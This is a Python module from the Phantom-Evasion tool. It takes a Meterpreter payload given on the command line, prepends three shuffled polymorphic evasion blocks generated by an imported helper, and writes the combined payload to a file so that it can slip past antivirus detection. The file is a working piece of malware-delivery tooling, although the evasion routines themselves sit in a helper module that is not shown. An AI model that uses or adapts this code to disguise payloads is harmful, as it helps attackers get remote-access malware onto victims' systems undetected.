
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################
 
import random
import random, string
import sys
from random import shuffle
sys.path.append("Modules/payloads/auxiliar")
import usefull


Pytherpreter = sys.argv[1]
Filename = sys.argv[2] 

x=[[i] for i in range(1,4)]

shuffle(x)
a=str(x[0])
b=str(x[1])
c=str(x[2])
a=a.replace("[","")
a=a.replace("]","")
b=b.replace("[","")
b=b.replace("]","")
c=c.replace("[","")
c=c.replace("]","")

MorphEvasion1 = str(usefull.python_poly_multipath(a,"1"))
MorphEvasion2 = str(usefull.python_poly_multipath(b,"2"))
MorphEvasion3 = str(usefull.python_poly_multipath(c,"3"))


Hollow_code = ""
Hollow_code += MorphEvasion1
Hollow_code += MorphEvasion2
Hollow_code += MorphEvasion3 
Hollow_code += "           " + Pytherpreter + "\n"
Hollow_code = Hollow_code.encode('utf-8') 

with open(Filename,'wb') as f:
    f.write(Hollow_code)

